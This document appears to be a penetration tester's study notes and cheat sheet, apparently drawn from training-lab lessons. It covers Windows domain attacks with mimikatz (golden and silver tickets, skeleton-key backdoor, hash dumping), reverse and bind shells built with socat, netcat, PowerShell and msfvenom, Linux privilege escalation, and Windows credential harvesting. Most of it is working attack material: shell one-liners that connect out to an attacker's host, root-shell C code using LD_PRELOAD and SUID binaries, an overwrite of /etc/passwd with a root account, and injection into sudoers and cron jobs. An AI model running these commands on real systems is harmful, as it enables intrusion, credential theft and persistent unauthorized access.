  lsadump::lsa /inject /name:krbtgt - This will dump the hash as well as the security identifier needed to create a Golden Ticket. To create a silver ticket you need to change the /name: to dump the hash of either a domain admin account or a service account such as the SQLService account.


Create a Golden/Silver Ticket - 

Kerberos::golden /user:Administrator /domain:controller.local /sid: /krbtgt: /id: - This is the command for creating a golden ticket to create a silver ticket simply put a service NTLM hash into the krbtgt slot, the sid of the service account into sid, and change the id to 1103.
  Ex: kerberos::golden /user:Administrator /domain:controller.local /sid:S-1-5-21-432953485-3795405108-1502158860 /krbtgt:72cd714611b64cd4d5550cd2759db3f6 /id:500 

Use the Golden/Silver Ticket to access other machines -

misc::cmd - this will open a new elevated command prompt with the given ticket in mimikatz.

Access machines that you want, what you can access will depend on the privileges of the user that you decided to take the ticket from however if you took the ticket from krbtgt you have access to the ENTIRE network hence the name golden ticket; however, silver tickets only have access to those that the user has access to if it is a domain admin it can almost access the entire network however it is slightly less elevated from a golden ticket.

 -=-=-=-=-=-=
 Kerberos Backdoors w/ mimikatz 

Along with maintaining access using golden and silver tickets mimikatz has one other trick up its sleeves when it comes to attacking Kerberos. Unlike the golden and silver ticket attacks a Kerberos backdoor is much more subtle because it acts similar to a rootkit by implanting itself into the memory of the domain forest allowing itself access to any of the machines with a master password. 

The Kerberos backdoor works by implanting a skeleton key that abuses the way that the AS-REQ validates encrypted timestamps. A skeleton key only works using Kerberos RC4 encryption. 

The default hash for a mimikatz skeleton key is 60BA4FCADC466C7A033C178194C03DF6 which makes the password -"mimikatz"

Skeleton Key Overview -

The skeleton key works by abusing the AS-REQ encrypted timestamps as I said above, the timestamp is encrypted with the users NT hash. The domain controller then tries to decrypt this timestamp with the users NT hash, once a skeleton key is implanted the domain controller tries to decrypt the timestamp using both the user NT hash and the skeleton key NT hash allowing you access to the domain forest.

privilege::debug
misc::skeleton 

Accessing the forest - 

The default credentials will be: "mimikatz"

example: net use c:\\DOMAIN-CONTROLLER\admin$ /user:Administrator mimikatz - The share will now be accessible without the need for the Administrators password

example: dir \\Desktop-1\c$ /user:Machine1 mimikatz - access the directory of Desktop-1 without ever knowing what users have access to Desktop-1

The skeleton key will not persist by itself because it runs in the memory, it can be scripted or persisted using other tools and techniques

-=-=-=-=-=-=-=
post-exploitation 

Powerview is a powerful powershell script from powershell empire that can be used for enumerating a domain after you have already gained a shell in the system.

1.)Start Powershell - powershell -ep bypass -ep bypasses the execution policy of powershell allowing you to easily run scripts
2.) Start PowerView - . .\Downloads\PowerView.ps1
3.) Enumerate the domain users - Get-NetUser | select cn
4.) Enumerate the domain groups - Get-NetGroup -GroupName *admin*    
get-smbshare -name [share] | fl *
get-smbshareaccess -name "share"
get-netcomputer -fulldata | select operatingsystem

-=-=-=-
Enumeration w/ Bloodhound
Bloodhound is a graphical interface that allows you to visually map out the network. This tool along with SharpHound which similar to PowerView takes the user, groups, trusts etc. of the network and collects them into .json files to be used inside of Bloodhound.

Well be focusing on how to collect the .json files and how to import them into Bloodhound

BloodHound Installation -

1.) apt-get install bloodhound    

2.) neo4j console - default credentials -> neo4j:neo4j

Getting loot w/ SharpHound -

get-executionpolicy
1.) powershell -ep bypass same as with PowerView

2.) . .\Downloads\SharpHound.ps1    

3.) Invoke-Bloodhound -CollectionMethod All -Domain CONTROLLER.local -ZipFileName loot.zip
-=-=-=-==
Dumping hashes w/ mimikatz 

privilege::debug 
lsadump::lsa /patch 

-=-=-=-=-=
Enumeration w/Server Manager


Because servers are hardly ever logged on unless its for maintenance this gives you an easy way for enumeration only using the built in windows features such as the server manager. If you already have domain admin you have a lot of access to the server manager in order to change trusts, add or remove users, look at groups, this can be an entry point to find other users with other sensitive information on their machines or find other users on the domain network with access to other networks in order to pivot to another network and continue your testing.

The only way to access the server manager is to rdp into the server and access the server over an rdp connection

We'll only be going over the basics such as looking at users, groups, and trusts however there are a lot of other mischief that you can get your hands on in terms of enumerating with the server manager

This can also be a way of easily identifying what kind of firewall the network is using if you have not already enumerated it.

-=-=-=-=-=-=-==============================
Intro to shells

One of the most prominent of these is Payloads all the Things. The PentestMonkey Reverse Shell Cheatsheet is also commonly used. In addition to these online resources, Kali Linux also comes pre-installed with a variety of webshells located at /usr/share/webshells. The SecLists repo, though primarily used for wordlists, also contains some very useful code for obtaining shells.

Be aware that if you choose to use a port below 1024, you will need to use sudo when starting your listener.

-=-=-=-=-=-=-=-=
-=-=-=-=-=-=-=-=
Socat 
#Most machines do not have socat installed by default, however, it's possible to upload a precompiled socat binary, which can then be executed as normal.
Reverse shells
  socat TCP-L:<port> - #Equivalent to nc -lvnp <port>. 
  Linux: socat TCP:<LOCAL-IP:<LOCAL-PORT> EXEC:"bash -li"
  Windows: socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:powershell.exe,pipes #Pipes used to force powershell or cmd.exe to use Unix style standard input and output

Bind shells
  socat TCP:<TARGET-IP>:<TARGET-PORT> -
  Linux: socat TCP-L:<PORT> EXEC:"bash -li"
  Windows: socat TCP-L:<PORT> EXEC:powershell.exe,pipes

Fully stable Linux TTY reverse shell. Only on Linux.
  socat TCP-L:<port> FILE:`tty`,raw,echo=0
  socat TCP:<attacker-ip>:<attacker-port> EXEC:"bash -li",pty,stderr,sigint,setsid,sane
      pty, allocates a pseudoterminal on the target -- part of the stabilisation process
      stderr, makes sure that any error messages get shown in the shell (often a problem with non-interactive shells)
      sigint, passes any Ctrl + C commands through into the sub-process, allowing us to kill commands inside the shell
      setsid, creates the process in a new session
      sane, stabilises the terminal, attempting to "normalise" it.
  If, at any point, a socat shell is not working correctly, it's well worth increasing the verbosity by adding -d -d into the command. This is very useful for experimental purposes, but is not usually necessary for general use.

Encrypted shells 
    openssl req --newkey rsa:2048 -nodes -keyout shell.ke -x509 -days 362 -out shell.crt
  We then need to merge the two files into a single .pem file:
    cat shell.key shell.crt > shell.pem
  Reverse shell
    socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 -
    socat OPENSSL:<LOCAL-IP>:<LOCAL-PORT>,verify=0 EXEC:/bin/bash
  Bind shell
    socat OPENSSL:<TARGET-IP>:<TARGET-PORT>,verify=0 -
    socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 EXEC:cmd.exe,pipes

  verify=0 tells the connection to not bother trying to validate that our certificate has been properly signed by a recognised authority. Please note that the certificate must be used on whichever device is listening.

Example: socat OPENSSL-LISTEN:53,cert=encrypt.pem,verify=0 FILE:`tty`,raw,echo=0
-=-=-=-=-=-=-=-
Common shell payloads

As a listener:
  nc -lvnp <PORT> -e /bin/bash #This would result in a bind shell on the target
As attacker
  nc <LOCAL-IP> <PORT> -e /bin/bash # Reverse shell on the target

Linux to create a listener for a bind shell
  mkfifo /tmp/f; nc -lvnp <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f

  Send a netcat reverse shell
    mkfifo /tmp/f; nc <LOCAL-IP> <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f

In Windows:
  powershell -c "$client = New-Object System.Net.Sockets.TCPClient('<ip>',<port>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"

-=-=-=-=-=-=-=-=-=
msfvenom
  
msfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell.exe LHOST=<listen-IP> LPORT=<listen-port>
msfvenom -p windows/shell_reverse_tcp LHOST=10.9.0.98 LPORT=4443 -e x86/shikata_ga_nai -f exe-service -o Advanced.exe


Staged payloads are sent in two parts. The first part is called the stager. This is a piece of code which is executed directly on the server itself. It connects back to a waiting listener, but doesn't actually contain any reverse shell code by itself. Instead it connects to the listener and uses the connection to load the real payload, executing it directly and preventing it from touching the disk where it could be caught by traditional anti-virus solutions. Thus the payload is split into two parts -- a small initial stager, then the bulkier reverse shell code which is downloaded when the stager is activated. Staged payloads require a special listener -- usually the Metasploit multi/handler, which will be covered in the next task.

Stageless payloads are more common -- these are what we've been using up until now. They are entirely self-contained in that there is one piece of code which, when executed, sends a shell back immediately to the waiting listener.

#Payload Naming Conventions

  When working with msfvenom, it's important to understand how the naming system works. The basic convention is as follows:
  <OS>/<arch>/<payload>

  For example:
  linux/x86/shell_reverse_tcp
  This would generate a stageless reverse shell for an x86 Linux target.

  The exception to this convention is Windows 32bit targets. For these, the arch is not specified. e.g.:
  windows/shell_reverse_tcp

  For a 64bit Windows target, the arch would be specified as normal (x64).

  Let's break the payload section down a little further.
  In the above examples the payload used was shell_reverse_tcp. This indicates that it was a stageless payload. How? Stageless payloads are denoted with underscores (_). 

  The staged equivalent to this payload would be:
    shell/reverse_tcp
  As staged payloads are denoted with another forward slash (/).

  This rule also applies to Meterpreter payloads. A Windows 64bit staged Meterpreter payload would look like this:
  windows/x64/meterpreter/reverse_tcp

  A Linux 32bit stageless Meterpreter payload would look like this:

  linux/x86/meterpreter_reverse_tcp

  Aside from the msfconsole man page, the other important thing to note when working with msfvenom is:

  msfvenom --list payloads

  This can be used to list all available payloads, which can then be piped into grep to search for a specific set of payloads.
-=-=-=-=-
Once we gain access to a shell

On Linux ideally we would be looking for opportunities to gain access to a user account. SSH keys stored at /home/<user>/.ssh are often an ideal way to do this. In CTFs it's also not infrequent to find credentials lying around somewhere on the box. Some exploits will also allow you to add your own account. In particular something like Dirty C0w or a writeable /etc/shadow or /etc/passwd would quickly give you SSH access to the machine, assuming SSH is open.

On Windows the options are often more limited. It's sometimes possible to find passwords for running services in the registry. VNC servers, for example, frequently leave passwords in the registry stored in plaintext. Some versions of the FileZilla FTP server also leave credentials in an XML file at C:\Program Files\FileZilla Server\FileZilla Server.xml
 or C:\xampp\FileZilla Server\FileZilla Server.xml
. These can be MD5 hashes or in plaintext, depending on the version.

Ideally on Windows you would obtain a shell running as the SYSTEM user, or an administrator account running with high privileges. In such a situation it's possible to simply add your own account (in the administrators group) to the machine, then log in over RDP, telnet, winexe, psexec, WinRM or any number of other methods, dependent on the services running on the box.


The syntax for this is as follows:

net user <username> <password> /add

net localgroup administrators <username> /add

-=-=-=-=
RDP 
  xfreerdp /dynamic-resolution +clipboard /cert:ignore /v:MACHINE_IP /u:Administrator /p:'TryH4ckM3!'

-=-=-=-=-=-=-=-=-=-=-=
Linux privelege escalation

1.enumeration 
2.kernel exploits 
3.sudo 
4.suid 
5.capabilities 
6.cron jobs 
7.PATH 
8.NFS 
9.SS
10.lxd

1.First things to check
 hostname
 uname -a 
 /proc/version may give you information on the kernel version and additional data such as whether a compiler (e.g. GCC) is installed.
 /etc/issue
 ps Command
  The ps command is an effective way to see the running processes on a Linux system. Typing ps on your terminal will show processes for the current shell.
  The output of the ps (Process Status) will show the following;
    PID: The process ID (unique to the process)
    TTY: Terminal type used by the user
    Time: Amount of CPU time used by the process (this is NOT the time this process has been running for)
    CMD: The command or executable running (will NOT display any command line parameter)

  The “ps” command provides a few useful options.

    ps -A: View all running processes
    ps axjf: View process tree (see the tree formation until ps axjf is run below)
    ps aux: The aux option will show processes for all users (a), display the user that launched the process (u), and show processes that are not attached to a terminal (x). Looking at the ps aux command output, we can have a better understanding of the system and potential vulnerabilities.

  env

    The env command will show environmental variables.
    The PATH variable may have a compiler or a scripting language (e.g. Python) that could be used to run code on the target system or leveraged for privilege escalation.
    If a folder for which your user has write permission is located in the path, you could potentially hijack an application to run a script. PATH in Linux is an environmental variable that tells the operating system where to search for executables. For any command that is not built into the shell or that is not defined with an absolute path, Linux will start searching in folders defined under PATH

  sudo -l
    The target system may be configured to allow users to run some (or all) commands with root privileges. The sudo -l command can be used to list all commands your user can run using sudo.

  Id
    The id command will provide a general overview of the user’s privilege level and group memberships.
    It is worth remembering that the id command can also be used to obtain the same information for another user as seen below.

  /etc/passwd
    Reading the /etc/passwd file can be an easy way to discover users on the system.

  history
    Looking at earlier commands with the history command can give us some idea about the target system and, albeit rarely, have stored information such as passwords or usernames.

  ifconfig
    The target system may be a pivoting point to another network. 

  ip route 
    To see wich network routes exist

  netstat
      netstat -a: shows all listening ports and established connections.
      netstat -at or netstat -au can also be used to list TCP or UDP protocols respectively.
      netstat -l: list ports in “listening” mode. These ports are open and ready to accept incoming connections. This can be used with the “t” option to list only ports that are listening using the TCP protocol (below)
      netstat -s: list network usage statistics by protocol (below) This can also be used with the -t or -u options to limit the output to a specific protocol. 
      netstat -tp: list connections with the service name and PID information. This can also be used with the -l option to list listening ports
      netstat -i: Shows interface statistics. We see below that “eth0” and “tun0” are more active than “tun1”.

  The netstat usage you will probably see most often in blog posts, write-ups, and courses is netstat -ano which could be broken down as follows;

      -a: Display all sockets
      -n: Do not resolve names
      -o: Display timers

  find Command

  Find files:

      find . -name flag1.txt: find the file named “flag1.txt” in the current directory
      find /home -name flag1.txt: find the file names “flag1.txt” in the /home directory
      find / -type d -name config: find the directory named config under “/”
      find / -type f -perm 0777: find files with the 777 permissions (files readable, writable, and executable by all users)
      find / -perm a=x: find executable files
      find /home -user frank: find all files for user “frank” under “/home”
      find / -mtime 10: find files that were modified in the last 10 days
      find / -atime 10: find files that were accessed in the last 10 day
      find / -cmin -60: find files changed within the last hour (60 minutes)
      find / -amin -60: find files accesses within the last hour (60 minutes)
      find / -size 50M: find files with a 50 MB size. This command can also be used with (+) and (-) signs to specify a file that is larger or smaller than the given size.

  It is important to note that the “find” command tends to generate errors which sometimes makes the output hard to read. This is why it would be wise to use the “find” command with “-type f 2>/dev/null” to redirect errors to “/dev/null” and have a cleaner output 


  Folders and files that can be written to or executed from:

      find / -writable -type d 2>/dev/null : Find world-writeable folders
      find / -perm -222 -type d 2>/dev/null: Find world-writeable folders
      find / -perm -o w -type d 2>/dev/null: Find world-writeable folders

  The reason we see three different “find” commands that could potentially lead to the same result can be seen in the manual document. As you can see below, the perm parameter affects the way “find” works.


      find / -perm -o x -type d 2>/dev/null : Find world-executable folders

  Find development tools and supported languages:

      find / -name perl*
      find / -name python*
      find / -name gcc*

  Find specific file permissions:

  Below is a short example used to find files that have the SUID bit set. The SUID bit allows the file to run with the privilege level of the account that owns it, rather than the account which runs it. This allows for an interesting privilege escalation path,we will see in more details on task 6. The example below is given to complete the subject on the “find” command.

      find / -perm -u=s -type f 2>/dev/null: Find files with the SUID bit, which allows us to run the file with a higher privilege level than the current user. 


  cat /etc/shells #Check available shells

  1 –> Sticky Bit

  2 –> SGID

  4 –> SUID

  7 –> Todos los anteriores

  find / -perm -u=s -type f 2>/dev/null
  find / -perm /4000 -type f 2>/dev/null
  find / -user root -perm -4000 -exec ls -ldb {} \;
  find / -type f -perm -04000 -ls 2>/dev/null will list files that have SUID or SGID bits set.
##Automated enumaration tools 
LinPeas: https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS
LinEnum: https://github.com/rebootuser/LinEnum
LES (Linux Exploit Suggester): https://github.com/mzet-/linux-exploit-suggester
Linux Smart Enumeration: https://github.com/diego-treitos/linux-smart-enumeration
Linux Priv Checker: https://github.com/linted/linuxprivchecker

Readable /etc/shadow
Writable /etc/shadow
  mkpasswd -m sha-512 newpasswordhere
Writable /etc/passwd
  openssl passwd newpasswordhere
sudo -l 
nano
  sudo nano
  ctrl+r 
  ctrl+x 
  reset; sh 1>&0 2>&0 

#another way
  openssl passwd -1 -salt loquesea pass
  We will need the hash value of the password we want the new user to have. This can be done quickly using the openssl tool on Kali Linux.
  We will then add this password with a username to the /etc/passwd file.



vim
  sudo vim -c ':!/bin/bash'
  or 
  sudo vim 
  :set shell=/bin/bash 
  :shell
apache2
  sudo apache2 -f /etc/shadow
wget 
  On Attaker Side.

  First Copy Target’s /etc/passwd file to attacker machine.
  modify file and add a user in passwd file which is saved in the previous step to the attacker machine.
  append this line only =>  touhid:$6$bxwJfzor$MUhUWO0MUgdkWfPPEydqgZpm.YtPMI/gaM4lVqhP21LFNWmSJ821kvJnIyoODYtBh.SF9aR7ciQBRCcw5bgjX0:0:0:root:/root:/bin/bash
  host that passwd file to using any web server.

  On Victim Side.
  sudo wget http://192.168.56.1:8080/passwd -O /etc/passwd

  now switch user
awk
  sudo awk 'BEGIN {system("/bin/bash")}'
less
  sudo less /etc/profile #For example
ftp
  sudo ftp
  !/bin/bash
nmap 
  TF=$(mktemp)
  echo 'os.execute("/bin/sh")' > $TF
  sudo nmap --script=$TF

  sudo nmap --interactive 
  !/bin/bash
more
  sudo TERM= more /etc/profile 
  !/bin/sh
systemctl
  TF=$(mktemp).service
  echo '[Service]
  Type=oneshot
  ExecStart=/bin/sh -c "whoami"
  [Install]
  WantedBy=multi-user.target' > $TF
  /bin/systemctl link $TF
  /bin/systemctl enable --now $TF
  /bin/bash -p

-=-=-=-=-=-=-=-=-=-=-=-=-=
#Environment variables
gcc -fPIC -shared -nostartfiles -o /tmp/exploiting.so /home/user/tools/sudo/preload.c
  
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init(){
  usetenv("LD_PRELOAD");
  setresuid(0,0,0);
  system("/bin/bash -p");
}

sudo LD_PRELOAD=/tmp/exploiting.so program-name-here
-=-=-=
Another example with LD_PRELOAD 

LD_PRELOAD is a function that allows any program to use shared libraries. This blog post will give you an idea about the capabilities of LD_PRELOAD. If the "env_keep" option is enabled we can generate a shared library which will be loaded and executed before the program is run. Please note the LD_PRELOAD option will be ignored if the real user ID is different from the effective user ID.

The steps of this privilege escalation vector can be summarized as follows;

    Check for LD_PRELOAD (with the env_keep option)
    Write a simple C code compiled as a share object (.so extension) file
    Run the program with sudo rights and the LD_PRELOAD option pointing to our .so file

The C code will simply spawn a root shell and can be written as follows;

#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}

The function is named _init and that's important, otherwise your exploit code won't work. The reason is that the  _init function runs before any other user-defined code runs, to perform all the necessary initializations. So the name has to be the same, or else it won't work*

We can save this code as shell.c and compile it using gcc into a shared object file using the following parameters;

gcc -fPIC -shared -o shell.so shell.c -nostartfiles


We can now use this shared object file when launching any program our user can run with sudo. In our case, Apache2, find, or almost any of the programs we can run with sudo can be used.

We need to run the program by specifying the LD_PRELOAD option, as follows;

sudo LD_PRELOAD=/home/user/ldpreload/shell.so find

This will result in a shell spawn with root privileges.

-=-
#Apache2 has an option that supports loading alternative configuration files (-f : specify an alternate ServerConfigFile). Loading the /etc/shadow file using this option will result in an error message that includes the first line of the /etc/shadow file. 


ldd /usr/sbin/apache2
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c 

#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack(){
  unsetenv("LD_LIBRARY_PATH");
  setresuid(0,0,0);
  system("/bin/bash -p");
}

sudo LD_LIBRARY_PATH=/tmp apache2

-=-=-=
SUID/SGID Executables 

SUID Bit - Files: User executes the file with permissions of the file owner // Directories: -
SGID Bit - Files: User executes the file with the permission of the group owner. // Directories: File created in directory gets the same group owner.
Sticky Bit - Files: No meaning	//Directories: Users are prevented from deleting files from other users.

#One way is doing a strings in a file and checking if is not full path. In that case, using curl as an example
  echo /bin/sh > curl
  chmod 777 curl
  [change PATH]
  [run binary]

find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null

#Shared object Injection
strace /usr/local/bin/suid-so 2>&1 | grep -iE "open|access|no such file"
mkidr /home/user/.config
gcc -share -fPIC -o /home/user/.config/libcalc.so /home/user/tools/suid/libcalc.c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject() {
	setuid(0);
	system("/bin/bash -p");
}

-=-=-=-=
Privilege escalation: Capabilities

Another method system administrators can use to increase the privilege level of a process or binary is “Capabilities”. Capabilities help manage privileges at a more granular level. For example, if the SOC analyst needs to use a tool that needs to initiate socket connections, a regular user would not be able to do that. If the system administrator does not want to give this user higher privileges, they can change the capabilities of the binary. As a result, the binary would get through its task without needing a higher privilege user.
The capabilities man page provides detailed information on its usage and options.

We can use the getcap tool to list enabled Capabilities. This privilege escalation vector is therefore not discoverable when enumerating files looking for SUID.

getcap -r / 2>/dev/null

=-=-=-=
PATH  

We could use this script:
#include <unistd.h>
void main()
{
    setuid(0);
    setgid(0);
    system("thm");
}

This script tries to launch a system binary called “thm” but the example can easily be replicated with any binary.

We compile this into an executable and set the SUID bit
  gcc path_exp.c -o path -w
  chmod u+s path

Once executed “path” will look for an executable named “thm” inside folders listed under PATH.

If any writable folder is listed under PATH we could create a binary named thm under that directory and have our “path” script run it. As the SUID bit is set, this binary will run with root privilege

A simple search for writable folders can done using the “find / -writable 2>/dev/null” command
find / -writable 2>/dev/null | cut -d"/" -f 2,3 | sort -u

The folder that will be easier to write to is probably /tmp. At this point because /tmp is not present in PATH so we will need to add it.
  export PATH=/tmp:$PATH

We have given executable rights to our copy of /bin/bash, please note that at this point it will run with our user’s right. What makes a privilege escalation possible within this context is that the path script runs with root privileges.

-=-=-=-=
Network File Sharing

NFS (Network File Sharing) configuration is kept in the /etc/exports file. This file is created during the NFS server installation and can usually be read by users.

The critical element for this privilege escalation vector is the “no_root_squash” option you can see above. By default, NFS will change the root user to nfsnobody and strip any file from operating with root privileges. If the “no_root_squash” option is present on a writable share, we can create an executable with SUID bit set and run it on the target system.

We will start by enumerating mountable shares from our attacking machine.
  showmount -e 10.10.45.161

We will mount one of the “no_root_squash” shares to our attacking machine and start building our executable.
#In our machine 
  mkdir /tmp/loquesea 
  mount -o rw 10.10.45.161:/<el share> /tmp/loquesea

#include <stdio.h>
#include <stdlib.h>

int main()
{
   setgid(0);
   setuid(0);
   system("/bin/bash");
   return 0;
}

-=-=-=-=
9.SSH
SSH port forwarding specifies that the given port on the remote server host is to be forwarded to the given host and port on the local side.

-L is a local tunnel (YOU <-- CLIENT). If a site was blocked, you can forward the traffic to a server you own and view it. For example, if imgur was blocked at work, you can do ssh -L 9000:imgur.com:80 user@example.com. Going to localhost:9000 on your machine, will load imgur traffic using your other server.

-R is a remote tunnel (YOU --> CLIENT). You forward your traffic to the other server for others to view. Similar to the example above, but in reverse.

    ssh -L 80:intra.example.com:80 gw.example.com 
    ssh -L 127.0.0.1:80:intra.example.com:80 gw.example.com

The same as listening but with socat 
./socat TCP-LISTEN:8888,fork TCP:127.0.0.1:80 &

-=-=-=-=
lxd
Able to deploy docker
 - searchsploit lxd 
 - check linux version. If 32 bits: ./build-alpine -a i686
 - transfer files to victim machine 
 - lxd_privesc.sh -f *.tar.gz 
 - If "This mus be run as root"
 - lxc image list # Imagen ya creada

#Troubleshooting
1.) Run this command in your home directory - git clone https://github.com/saghul/lxd-alpine-builder.git
2.) Then this - sudo ./build-alpine
3.) If above command run properly without errors then congrats!
4.) If not maybe the error is due to mirror sites but it will create a rootfs directory in same folder i.e "lxd-alpine-builder" .
5.) Goto - cd/rootfs/usr/share/alpine-mirrors/Mirrors.txt
6.) Open that .txt file with any editor and remove all the mirror sites except first one, then save it there only.
7.) Again run - sudo ./build-alpine


-=-=-=-=
Passwords & keys 
cat ~/.*history | less
ls -la /

-=-=-=-=-=-=-=
/etc/passwd
    Username: It is used when user logs in. It should be between 1 and 32 characters in length.
    Password: An x character indicates that encrypted password is stored in /etc/shadow file. Please note that you need to use the passwd command to compute the hash of a password typed at the CLI or to store/update the hash of the password in /etc/shadow file, in this case, the password hash is stored as an "x".
    User ID (UID): Each user must be assigned a user ID (UID). UID 0 (zero) is reserved for root and UIDs 1-99 are reserved for other predefined accounts. Further UID 100-999 are reserved by system for administrative and system accounts/groups.
    Group ID (GID): The primary group ID (stored in /etc/group file)
    User ID Info: The comment field. It allow you to add extra information about the users such as user’s full name, phone number etc. This field use by finger command.
    Home directory: The absolute path to the directory the user will be in when they log in. If this directory does not exists then users directory becomes /
    Command/shell: The absolute path of a command or shell (/bin/bash). Typically, this is a shell. Please note that it does not have to be a shell.

If we can write on it:
  Before we add our new user, we first need to create a compliant password hash to add! We do this by using the command: "openssl passwd -1 -salt [salt] [password]

/usr/bin/vi with sudo -l ==> sudo vi ==> :!sh

-=-=-=-=-
Crontabs
Cron job configurations are stored as crontabs (cron tables) to see the next time and date the task will run.



cat /etc/crontab

bash -i >& /dev/tcp/<IP>/4126 0>&1

other file to create

cp /bin/bash /tmp/rootbash
chmod +xs /tmp/rootbash
/tmp/rootbash -p

#another example
The example above shows a similar situation where the antivirus.sh script was deleted, but the cron job still exists.
If the full path of the script is not defined (as it was done for the backup.sh script), cron will refer to the paths listed under the PATH variable in the /etc/crontab file. In this case, we should be able to create a script named “antivirus.sh” under our user’s home folder and it should be run by the cron job

#other example with this backup.sh
www-data@skynet:/home/milesdyson/backups$ cat backup.sh
#!/bin/bash
cd /var/www/html
tar cf /home/milesdyson/backups/backup.tgz *

echo 'echo "www-data ALL=(root) NOPASSWD: ALL" > /etc/sudoers' > privesc.sh
echo "/var/www/html"  > "--checkpoint-action=exec=sh privesc.sh"
echo "/var/www/html"  > --checkpoint=1

#With wildcards
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f elf -o shell.elf #In our host. SCP to the other machine 
chmod +x /home/user/shell.elf
touch /home/user/--checkpoint=1
touch /home/user/--checkpoint-action=exec=shell.elf
-=-=-=-=-

Windows privilege escalation
https://github.com/AonCyberLabs/Windows-Exploit-Suggester

1.Harvesting passwords from usual spots

Any user with administrative privileges will be part of the Administrators group. On the other hand, standard users are part of the Users group.

In addition to that, you will usually hear about some special built-in accounts used by the operating system in the context of privilege escalation:
SYSTEM / LocalSystem
	An account used by the operating system to perform internal tasks. It has full access to all files and resources available on the host with even higher privileges than administrators.
Local Service
	Default account used to run Windows services with "minimum" privileges. It will use anonymous connections over the network.
tasklist /svc | findstr /i windowsscheduler
Network Service
	Default account used to run Windows services with "minimum" privileges. It will use the computer credentials to authenticate through the network.

These accounts are created and managed by Windows, and you won't be able to use them as other regular accounts. Still, in some situations, you may gain their privileges due to exploiting specific services.


Unattended Windows Installations

When installing Windows on a large number of hosts, administrators may use Windows Deployment Services, which allows for a single operating system image to be deployed to several hosts through the network. These kinds of installations are referred to as unattended installations as they don't require user interaction. Such installations require the use of an administrator account to perform the initial setup, which might end up being stored in the machine in the following locations:

    C:\Unattend.xml
    C:\Windows\Panther\Unattend.xml
    C:\Windows\Panther\Unattend\Unattend.xml
    C:\Windows\system32\sysprep.inf
    C:\Windows\system32\sysprep\sysprep.xml

As part of these files, you might encounter credentials:

<Credentials>
    <Username>Administrator</Username>
    <Domain>thm.local</Domain>
    <Password>MyPassword123</Password>
</Credentials>

#Cleartext passwords 
# Windows autologin
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"

# VNC
reg query "HKCU\Software\ORL\WinVNC3\Password"

# SNMP Parameters
reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP"

# Putty
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"

# Search for password in registry
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s

Powershell History

Whenever a user runs a command using Powershell, it gets stored into a file that keeps a memory of past commands. This is useful for repeating commands you have used before quickly. If a user runs a command that includes a password directly as part of the Powershell command line, it can later be retrieved by using the following command from a cmd.exe prompt:

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt

Note: The command above will only work from cmd.exe, as Powershell won't recognize %userprofile% as an environment variable. To read the file from Powershell, you'd have to replace %userprofile% with $Env:userprofile. 


Saved Windows Credentials

Windows allows us to use other users' credentials. This function also gives the option to save these credentials on the system. The command below will list saved credentials:

cmdkey /list

While you can't see the actual passwords, if you notice any credentials worth trying, you can use them with the runas command and the /savecred option, as seen below.

runas /savecred /user:admin cmd.exe


IIS Configuration

Internet Information Services (IIS) is the default web server on Windows installations. The configuration of websites on IIS is stored in a file called web.config and can store passwords for databases or configured authentication mechanisms. Depending on the installed version of IIS, we can find web.config in one of the following locations:

    C:\inetpub\wwwroot\web.config
    C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config

Here is a quick way to find database connection strings on the file:

type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString

#Another way 
Get-ChildItem -Path V:\Myfolder -Filter CopyForbuild.bat -Recurse -ErrorAction SilentlyContinue -Force


Retrieve Credentials from Software: PuTTY

PuTTY is an SSH client commonly found on Windows systems. Instead of having to specify a connection's parameters every single time, users can store sessions where the IP, user and other configurations can be stored for later use. While PuTTY won't allow users to store their SSH password, it will store proxy configurations that include cleartext authentication credentials.

To retrieve the stored proxy credentials, you can search under the following registry key for ProxyPassword with the following command:

reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s

Note: Simon Tatham is the creator of PuTTY (and his name is part of the path), not the username for which we are retrieving the password. The stored proxy username should also be visible after running the command above.

Just as putty stores credentials, any software that stores passwords, including browsers, email clients, FTP clients, SSH clients, VNC software and others, will have methods to recover any passwords the user has saved.

How to know if it has bitlocker enabled
#bitlocker 

get-bitlockervolume
manage-bde -status



        

Go to taskusr1 desktop to retrieve a flag. Don't forget to input the flag at the end of this task.


AlwaysInstallElevated

Windows installer files (also known as .msi files) are used to install applications on the system. They usually run with the privilege level of the user that starts it. However, these can be configured to run with higher privileges from any user account (even unprivileged ones). This could potentially allow us to generate a malicious MSI file that would run with admin privileges.

Note: The AlwaysInstallElevated method won't work on this room's machine and it's included as information only.

